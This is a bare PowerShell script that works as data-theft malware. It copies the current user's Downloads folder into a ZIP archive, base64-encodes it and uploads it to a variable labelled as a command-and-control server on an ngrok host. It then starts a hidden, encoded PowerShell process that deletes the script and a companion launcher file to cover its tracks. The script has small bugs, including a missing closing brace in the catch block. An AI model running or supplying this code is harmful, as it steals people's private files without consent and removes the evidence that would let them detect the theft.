# Define paths and server URL
$currentUser = [Environment]::UserName
$sourcePath = "C:\Users\$currentUser\Downloads"
$destinationPath = "C:\Users\$currentUser\$currentUser"
$zipFilePath = "C:\Users\$currentUser\$currentUser.zip"
$c2ServerUrl = "https://charmed-strictly-ringtail.ngrok-free.app/upload"

# Create a new folder in C:\Users\ with the current user's name and copy all files from Downloads
New-Item -ItemType Directory -Force -Path $destinationPath
Get-ChildItem -Path $sourcePath | Copy-Item -Destination $destinationPath -Recurse

# Compress the new folder into a ZIP file
Compress-Archive -Path "$destinationPath\*" -DestinationPath $zipFilePath -Force

# Prepare the multipart/form-data request
$boundary = [System.Guid]::NewGuid().ToString()
$LF = "`r`n"
$encoding = [System.Text.Encoding]::UTF8
$multipartContentType = "multipart/form-data; boundary=$boundary"
$contentDisposition = "form-data; name=`"file`"; filename=`"$($zipFilePath | Split-Path -Leaf)`""

# Read the file content
$fileContent = [System.IO.File]::ReadAllBytes($zipFilePath)
$encodedFileContent = [System.Convert]::ToBase64String($fileContent)

# Build the request body
$bodyLines = @(
    "--$boundary",
    "Content-Disposition: $contentDisposition",
    "Content-Type: application/octet-stream$LF",
    $encodedFileContent,
    "--$boundary--"
) -join $LF

# Convert the body to a byte array
$bodyBytes = $encoding.GetBytes($bodyLines)

# Create the WebClient object
$webClient = New-Object System.Net.WebClient

# Add the multipart/form-data content type header
$webClient.Headers.Add("Content-Type", $multipartContentType)

try {
    # Upload the file
    $webClient.UploadData($c2ServerUrl, "POST", $bodyBytes)
    "File uploaded successfully."
}
catch {
    "Failed to upload the file. Error: $_"

finally {
    $webClient.Dispose()
}

# Self-deletion part
$deletionScript = {
    Start-Sleep -Seconds 10
    Remove-Item -Path "C:\Users\$env:USERPROFILE\dl_ul.ps1" -Force
    Remove-Item -Path "C:\Users\$env:USERPROFILE\SilentLauncher.ps1" -Force
}

# Encode the deletion script to bypass the execution policy temporarily
$encodedDeletionScript = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($deletionScript))

# Start the self-deletion script in a new detached process
Start-Process -FilePath "powershell.exe" -ArgumentList "-NoProfile", "-EncodedCommand $encodedDeletionScript" -WindowStyle Hidden
